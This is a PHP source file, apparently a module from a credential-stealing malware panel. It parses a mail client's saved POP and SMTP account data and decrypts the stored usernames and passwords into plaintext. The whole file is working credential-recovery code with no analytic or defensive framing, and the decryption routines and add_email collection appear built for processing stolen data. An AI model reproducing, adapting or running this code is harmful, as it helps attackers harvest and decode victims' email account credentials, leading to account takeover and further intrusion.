<?php
class Module_ymail extends Module_
{
    private $Type;

	private function Wrap($Source)
	{
        $Password = urldecode($Source);
        $i = 0;
        $DecPW = $DECPW_ = '';
        while($i < strlen($Password))
        {
            $ch = $Password[$i++];
            if (($ch != "<") & ($ch != ">"))
                $DecPW .= $ch;
            else
            {
                if ($DecPW != "")
                    $DECPW_ .= chr($DecPW);

                $DecPW = "";
            }
        }
		
		return $DECPW_;
	}
	
    private function DecryptVB6($DECPW_, $WRAP = FALSE)
    {
        if(strlen($DECPW_) < 2)
            return '';
		
		if($WRAP)
		{
			$DECPW_ = $this->Wrap($DECPW_);
		}
		
        $Result = '';
        $B1_ = substr($DECPW_, 0, 1);
        if(ord($B1_) > 0x80)
        {
            for ($i = 0; $i <= strlen($DECPW_); $i++)
            {
                $str4 = substr($DECPW_, $i, 1);
                if (ord($str4) > 100)
                {
                    $Result .= chr(ord($str4) - 100);
                }
                else
                {
                    $Result .= chr(ord($str4));
                }
            }
        }

        return trim($Result);
    }	
	
    private function DecryptW($Source)
    {
        if(strlen($Source) < 2)
            return '';

        $DECPW_ = $this->Wrap($Source);

        $Result = '';
        for ($i = 1; $i <= strlen($DECPW_); $i += 5)
        {
            $Result .= chr(substr($DECPW_, $i - 1, 5));
        }

        return trim($Result);
    }
    
	private function ProcessItem($Source) //POP, SMTP
    {
        if($this->Type == 0)
        {
            $this->set_options("POP" . $Source->ID,
                               array(
                                   "Host" => Assign_($Source->Address),
                                   "Port" => Assign_($Source->Port),
                                   "User" => $this->DecryptVB6(Assign_($Source->Username, TRUE)),
                                   "Pass" => $this->DecryptW(Assign_($Source->PasswordV2)),
                                   "Pass2" => $this->DecryptVB6(Assign_($Source->Password, TRUE))
                               ));				
            return;
        }
        else if($this->Type == 1)
        {
            $this->set_options("SMTP" . $Source->ID,
                               array(
                                   "Host" => Assign_($Source->Address),
                                   "Port" => Assign_($Source->Port),
                                   "User" => $this->DecryptVB6(Assign_($Source->Username, TRUE)),
                                   "Pass" => $this->DecryptW(Assign_($Source->PasswordV2)),
                                   "Pass2" => $this->DecryptVB6(Assign_($Source->Password, TRUE))
                               ));
            return;
        }
		
		$Email 	= urldecode(Assign_($Source->ReturnAddress));
        $SMTPID = Assign_($Source->SMTPID);
        $POPID  = Assign_($Source->POPID);
		
		$SMTPa = $this->get_options("SMTP" . $SMTPID);
		if(isset($SMTPa))
		{
			$Pass = $SMTPa['Pass'];
			if(!strlen($Pass))
				$Pass = $SMTPa['Pass2'];
			
			$this->add_email($Email, "smtp", $SMTPa['Host'], $SMTPa['Port'], $SMTPa['User'], $Pass);
			$this->unset_options("SMTP" . $SMTPID);
		}
		
		$POPa = $this->get_options("POP" . $POPID);
		if(isset($POPa))
		{
			if(!strlen($Pass))
				$Pass = $POPa['Pass2'];
			
			$this->add_email($Email, "pop3", $POPa['Host'], $POPa['Port'], $POPa['User'], $Pass);
			$this->unset_options("POP" . $POPID);
		}
    }
    protected function ProcessItems($Elements)
    {
        if(isset($Elements->ID))
        {
            $this->ProcessItem($Elements);
            return;
        }

        foreach($Elements->children() as $Element)
        {
            if(isset($Element->ID))
            {
                $this->ProcessItem($Element);
            }
            else
            {
                if(!empty($Element))
                    $this->ProcessItems($Element);
            }
        }
    }
    protected function Process($Data)
    {
        $XML_ = simplexml_load_string($Data);
        if(!$XML_)
            return FALSE;

        if(isset($XML_))
            $this->ProcessItems($XML_);

        $XML_ = NULL;
    }
	
	private function ProcessOld($Data)
	{
		if (strlen($Data) == 0)
            return;

        $Lines = parse_lines($Data);
        $Email = $Prot = $POPServer	= $POPPort = $POPUser = $POPPass = $SMTPServer = $SMTPPort = $SMTPUser = $SMTPPass 	= '';

        foreach ($Lines as $Line)
        {
            if(strpos($Line, "PWD") !== false && strpos($Line, "SMTPPWD") === false)
			{
				$POPPass = $Prot = $POPServer	= $POPPort = $POPUser = $POPPass = $SMTPServer = $SMTPPort = $SMTPUser = $SMTPPass 	= '';
				$POPPass = $this->DecryptVB6(strstr_after($Line, ","));
			}
            else if(strpos($Line, "UNAME") !== false && strpos($Line, "SMTPU") === false)
                $POPUser = strstr_after($Line, ",");
            else if(strpos($Line, "SERVER") !== false)
                $POPServer = strstr_after($Line, ",");
            else if(strpos($Line, "REPLYADDRESS") !== false)
                $Email = strstr_after($Line, ",");
            else if(strpos($Line, "SMTPUNAME") !== false)
                $SMTPUser = strstr_after($Line, ",");
            else if(strpos($Line, "SMTP") !== false && strpos($Line, "SMTPU") === false && strpos($Line, "SMTPP") === false && strpos($Line, "SMTPA") === false)
                $SMTPServer = strstr_after($Line, ",");
            else if(strpos($Line, "SMTPPWD") !== false)
                $SMTPPass = $this->DecryptVB6(strstr_after($Line, ","));
            else if(strpos($Line, "SMTPPORT") !== false)
                $SMTPPort = strstr_after($Line, ",");
			else if(strpos($Line, "EXCLUSIVE") !== false)
			{
				if($POPPass != '' || $SMTPPass != '')
				{
					$Pass = $POPPass;
					$User = $POPUser;
					
					$this->add_email($Email, 'pop3', $POPServer, '', $User, $Pass);
					
					if(strlen($SMTPPass))
						$Pass = $SMTPPass;
					
					if(strlen($SMTPUser))
						$User = $SMTPUser;
					
					$this->add_email($Email, 'smtp', $SMTPServer, $SMTPPort, $User, $Pass);
				}
				
				$POPPass = $Prot = $POPServer	= $POPPort = $POPUser = $POPPass = $SMTPServer = $SMTPPort = $SMTPUser = $SMTPPass 	= '';
			}
        }
		

	}

    public function process_module($Data, $Version)
    {
        switch ($Version)
        {
        case 0: //POP
            $this->Type = 0;
            $this->Process($Data);
            break;
        case 1: //SMTP
            $this->Type = 1;
            $this->Process($Data);
            break;
        case 2: //ACCs
            $this->Type = 2;
            $this->Process($Data);
            break;
        case 3: //ACCs
            $this->ProcessOld($Data);
            break;
        default:
            return FALSE;
        }

        return TRUE;
    }
}

